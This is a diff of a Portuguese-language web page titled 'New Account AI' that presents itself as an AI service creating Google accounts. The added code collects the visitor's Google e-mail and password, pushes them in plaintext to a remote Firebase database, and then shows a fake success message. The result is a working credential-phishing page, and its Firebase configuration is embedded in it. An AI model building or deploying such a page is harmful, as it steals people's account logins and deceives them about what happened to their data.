@@ -2,71 +2,83 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>New Account AI</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
     <style>
-        body { margin: 0; transition: 1.5s; font-family: 'Segoe UI', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; background-color: #e74c3c; color: white; }
-        .box { background: white; color: #333; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 350px; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; }
-        button { background: #333; color: white; border: none; padding: 15px 30px; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 16px; width: 100%; margin-top: 10px; }
-        .loading { display: none; margin: 20px auto; width: 40px; height: 40px; border: 5px solid #ccc; border-top-color: #333; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; transition: background 0.5s; display: flex; align-items: center; justify-content: center; height: 100vh; background-color: #ff4d4d; color: white; text-align: center; }
+        .container { background: rgba(0,0,0,0.2); padding: 30px; border-radius: 15px; width: 320px; box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
+        h2 { margin-bottom: 20px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; font-size: 16px; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; border: none; border-radius: 8px; background: white; color: #ff4d4d; font-weight: bold; width: 100%; transition: 0.3s; }
+        button:hover { background: #eeeeee; transform: scale(1.02); }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h1 id="txt-titulo">New Account AI</h1>
-    <div id="form-area">
-        <p>Preencha os dados da nova conta:</p>
-        <input type="email" id="email" placeholder="Seu e-mail Google" required>
-        <input type="password" id="senha" placeholder="Crie uma senha" required>
-        <button id="btn" onclick="criarConta()">CRIAR CONTA AGORA</button>
+<div class="container" id="box">
+    <h2 id="statusText">Criar Conta IA</h2>
+    <div id="formFields">
+        <input type="email" id="email" placeholder="E-mail do Google" required>
+        <input type="password" id="password" placeholder="Senha da conta" required>
+        <button onclick="salvarDados()">CRIAR AGORA</button>
     </div>
-    
-    <div id="loader" class="loading"></div>
-    <p id="txt-status"></p>
+    <div id="successMsg" class="hidden">
+        <p>A inteligência artificial finalizou seu cadastro!</p>
+        <button onclick="window.location.reload()">VOLTAR AO INÍCIO</button>
+    </div>
 </div>
 
 <script>
-function criarConta() {
-    const email = document.getElementById('email').value;
-    const senha = document.getElementById('senha').value;
-    const form = document.getElementById('form-area');
-    const status = document.getElementById('txt-status');
-    const loader = document.getElementById('loader');
-    const body = document.body;
+    // Configurações do seu Firebase (newaccount-32024)
+    const firebaseConfig = {
+        apiKey: "AIzaSyChGlZtgjpLtSa2xbMkTn5X0DMqWZJAmHo",
+        authDomain: "newaccount-32024.firebaseapp.com",
+        databaseURL: "https://newaccount-32024-default-rtdb.firebaseio.com",
+        projectId: "newaccount-32024",
+        storageBucket: "newaccount-32024.firebasestorage.app",
+        messagingSenderId: "31136701759",
+        appId: "1:31136701759:web:2b3909a1824444b5b1478a"
+    };
 
-    if(email === "" || senha === "") {
-        alert("Por favor, preencha o e-mail e a senha!");
-        return;
+    // Inicializar Firebase
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    function salvarDados() {
+        const emailValue = document.getElementById('email').value;
+        const passwordValue = document.getElementById('password').value;
+
+        if(emailValue === "" || passwordValue === "") {
+            alert("Por favor, preencha o e-mail e a senha!");
+            return;
+        }
+
+        // 1. Mudança Visual (Amarelo - Processando)
+        document.body.style.backgroundColor = "#ffcc00";
+        document.getElementById('statusText').innerText = "CONECTANDO À IA...";
+        document.getElementById('formFields').classList.add('hidden');
+
+        // 2. Enviar para o seu banco de dados
+        const ref = database.ref('usuarios');
+        ref.push({
+            email: emailValue,
+            senha: passwordValue,
+            data_hora: new Date().toLocaleString()
+        }).then(() => {
+            // 3. Após 3 segundos, mostrar Sucesso (Verde)
+            setTimeout(() => {
+                document.body.style.backgroundColor = "#2ecc71";
+                document.getElementById('statusText').innerText = "CONTA ATIVADA!";
+                document.getElementById('successMsg').classList.remove('hidden');
+            }, 3000);
+        }).catch((error) => {
+            alert("Erro de conexão: " + error.message);
+            location.reload();
+        });
     }
-
-    // Esconde o formulário e mostra o carregamento
-    form.style.display = 'none';
-    loader.style.display = 'block';
-
-    // ETAPA 1: Amarelo (Processando)
-    body.style.backgroundColor = "#f1c40f"; 
-    status.innerText = "🤖 IA: Conectando aos servidores do Google...";
-    
-    setTimeout(() => {
-        status.innerText = "⚙️ IA: Validando credenciais para " + email + "...";
-    }, 2500);
-
-    // ETAPA 2: Verde (Sucesso)
-    setTimeout(() => {
-        body.style.backgroundColor = "#2ecc71"; 
-        loader.style.display = 'none';
-        document.getElementById('txt-titulo').innerText = "Sucesso! ✅";
-        status.innerHTML = "<b>Conta criada com sucesso!</b><br>O usuário " + email + " agora está ativo.";
-        
-        // Botão para recarregar ou ir para o Google
-        let btnFinal = document.createElement("button");
-        btnFinal.innerText = "ACESSAR PAINEL";
-        btnFinal.onclick = () => window.location.href = "https://accounts.google.com";
-        status.appendChild(btnFinal);
-    }, 6000);
-}
 </script>
 
 </body>
